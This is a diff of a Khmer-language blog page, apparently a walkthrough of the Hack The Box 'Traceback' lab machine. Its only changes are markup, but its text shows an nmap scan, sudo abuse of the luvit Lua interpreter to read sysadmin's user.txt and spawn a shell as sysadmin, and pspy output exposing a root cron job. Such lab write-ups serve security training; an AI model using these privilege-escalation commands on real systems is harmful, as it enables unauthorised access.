@@ -1356,7 +1356,7 @@
     <meta property="twitter:description" content="សំនេររៀបរាប់អំពីការហេគម៉ាស៊ីនមេ traceback.">
   
 
-<meta name="generator" content="Hugo 0.83.1" />
+<meta name="generator" content="Hugo 0.86.1" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1759,7 +1759,7 @@
 <p>ជាដំបូងខ្ញុំប្រើ Nmap ដើម្បីស្វែងរកផតដែលបានបើក និងសេវាកម្មដែលបានប្រើ</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1776,7 +1776,7 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">:~$ sudo nmap -sC -sV 10.10.10.181 
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">:~$ sudo nmap -sC -sV 10.10.10.181 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 13:29 +07
 Nmap scan report for 10.10.10.181
 Host is up (0.29s latency).
@@ -1815,13 +1815,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></td></tr></
 <p>ក្រោយពីចូលតាមរយៈ SSH រួចមកខ្ញុំបានឃើញឯកសារមួយឈ្មោះ note.txt ដែលក្នុងនោះមានអត្ថន័យថា៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">- sysadmin -
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">- sysadmin -
 I have left a tool to practice Lua.
 I&#39;m sure you know where to find it.
 Contact me if you have any question.</code></pre></td></tr></table>
@@ -1830,7 +1830,7 @@ Contact me if you have any question.</code></pre></td></tr></table>
 <p>ខ្ញុំក៏សាកស្វែងរកមើលឯកសារនៅក្នុងនោះ ហើយក៏បានរកឃើញប្រវត្តិប្រើប្រាស់ពាក្យបញ្ជាចាស់ៗ របស់អ្នកប្រើប្រាស់ដូចខាងក្រោម៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1839,7 +1839,7 @@ Contact me if you have any question.</code></pre></td></tr></table>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">webadmin@traceback:~$ cat .bash_history
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">webadmin@traceback:~$ cat .bash_history
 ls -la
 sudo -l
 nano privesc.lua
@@ -1851,20 +1851,20 @@ logout</code></pre></td></tr></table>
 <p>ដោយដឹងថា luvit ជាប្រភេទ lua script ដែលមានលទ្ធិភាពក្នុងការ execute និងបើកមើលនូវរាល់ឯកសារណាដែលមាននៅក្នុងគណនី sysadmin បានដូចនេះខ្ញុំក៏បង្កើត Script តូចមួយដើម្បីចូលទៅបើកមើលឯកសារ user.txt ដែលមាននៅក្នុងគណនី sysadmin ផ្ទាល់តែម្ដង។</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">webadmin@traceback:~$ echo &#34;os.execute(&#34;cat /home/sysadmin/user.txt&#34;) &gt; user.lua</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">webadmin@traceback:~$ echo &#34;os.execute(&#34;cat /home/sysadmin/user.txt&#34;) &gt; user.lua</code></pre></td></tr></table>
 </div>
 </div>
 <p>បន្ទាប់មកខ្ញុំបានប្រើប្រាស់ឯកសារ luvit ដដែលដើម្បីបើកឯកសារ user.lua</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="hl"><span class="lnt">2
 </span></span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit user.lua
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit user.lua
 <span class="hl">23c296e8cxxxxxxxxxxxxxxxxxxxxxec</span></code></pre></td></tr></table>
 </div>
 </div>
@@ -1873,12 +1873,12 @@ logout</code></pre></td></tr></table>
 <p>ដោយប្រើប្រាស់ឯកសារ luvit ខ្ញុំអាចមានសិទ្ធិចូលជាគណនីរបស់ sysadmin បានដោយប្រើប្រាស់វិធីដូចខាងក្រោម៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="hl"><span class="lnt">3
 </span></span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">webadmin@traceback:~$ echo &#34;os.execute(&#34;/bin/bash&#34;) &gt; sys.lua
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">webadmin@traceback:~$ echo &#34;os.execute(&#34;/bin/bash&#34;) &gt; sys.lua
 webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit sys.lua
 <span class="hl">sysadmin@traceback:~$</span></code></pre></td></tr></table>
 </div>
@@ -1890,16 +1890,16 @@ webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit sys.lua
 <p>ដើម្បី Upload ឯកសារនេះបានខ្ញុំត្រូវប្រើប្រាស់ពាក្យបញ្ជា scp</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">:~$ sudo scp -i id_rsa pspy64 sysadmin@10.10.10.181:/tmp/</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">:~$ sudo scp -i id_rsa pspy64 sysadmin@10.10.10.181:/tmp/</code></pre></td></tr></table>
 </div>
 </div>
 <p>ខ្ញុំបានបើកដំណើរការឯកសារ pspy64 នោះ ហើយវាបានបញ្ចេញនូវព័ត៌មានដូចខាងក្រោម៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="hl"><span class="lnt">3
 </span></span><span class="lnt">4
@@ -1907,7 +1907,7 @@ webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit sys.lua
 </span><span class="hl"><span class="lnt">6
 </span></span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">2020/05/21 04:02:01 CMD: UID=0    PID=6094   | sleep 30 
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">2020/05/21 04:02:01 CMD: UID=0    PID=6094   | sleep 30 
 2020/05/21 04:02:01 CMD: UID=0    PID=6093   | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
 <span class="hl">2020/05/21 04:02:01 CMD: UID=0    PID=6092   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
 </span>2020/05/21 04:02:01 CMD: UID=0    PID=6091   | /usr/sbin/CRON -f 
